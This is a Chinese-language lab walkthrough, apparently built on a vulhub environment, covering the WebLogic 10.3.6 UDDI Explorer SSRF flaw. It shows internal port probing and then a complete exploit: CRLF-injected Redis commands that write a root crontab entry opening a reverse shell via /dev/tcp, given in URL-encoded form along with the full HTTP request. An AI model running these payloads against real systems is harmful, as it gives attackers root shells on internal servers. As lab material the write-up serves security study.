## 环境介绍
| 环境 | 版本/地址 |
| --- | --- |
| weblogic | WebLogic Server Version: 10.3.6.0<br />192.168.200.38 / 172.21.0.3 |
| redis | redis_version:2.8.24<br />172.21.0.2 |

## 背景
Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。SSRF漏洞存在于`http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp`
访问一个可以访问的IP:PORT，如http://127.0.0.1:7001
可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。

![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_44_NSdKtc8R.png)

修改为一个不存在的端口，将会返回could not connect over HTTP to server

![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_45_0JSfnBWX.png)

通过错误的不同，即可探测内网状态。

## 漏洞利用
### 注入HTTP头，利用Redis反弹shell
Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0d%0a`来注入换行符，而某些服务（如redis写入计划任务(需要运行在centos上，Ubuntu的定时任务会预检格式是否正确，格式不正确无法启动，由于redis备份文件会带上redis特定的标识，所以Ubuntu不能实现定时任务反弹shell)）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。
首先，通过ssrf探测内网中的redis服务器（redis服务在172.21.0.2）

![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_46_QqXmKryi.png)

确定存在redis服务之后，通过注入换行符来写入命令至计划任务

```shell
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.200.38/8888 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
# url 编码为
%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65
```
注意，换行符是"\r\n"，也就是"%0D%0A"
将url编码后的字符串放在ssrf的域名后面，发送：
```http
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.21.0.2:6379/%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65&rdoSearch=name&txtSearchname=11&txtSearchkey=11&txtSearchfor=1111&selfor=Business+location&btnSubmit=Search HTTP/1.1
Host: 192.168.200.38:7001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://192.168.200.38:7001
Connection: close
Referer: http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp
Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=RMpshL7ZPJ5PbTd26g8bNMCTjxvT74cgQ4bQv0tBk4BQZ14MhqhK!-1037380163; JSESSIONID=Zw8hhL7JJmZrsn1GXvYh9zThQnctb7SpJGTT9N9kl8DkkDQ32Gjp!-1037380163
Upgrade-Insecure-Requests: 1


```
实际redis服务接收到的请求如下图所示

![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_47_JDVAE1go.png)

写入计划任务后，执行反弹shell命令如下所示

![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_47_NcODZRIa.png)



## 其他
**最后补充一下，可进行利用的cron有如下几个地方：**

- /etc/crontab 这个是肯定的
- /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。
- /var/spool/cron/root centos系统下root用户的cron文件
- /var/spool/cron/crontabs/root debian系统下root用户的cron文件
## 参考链接
[https://vulhub.org/#/environments/weblogi.//](https://vulhub.org/#/environments/weblogi.//)

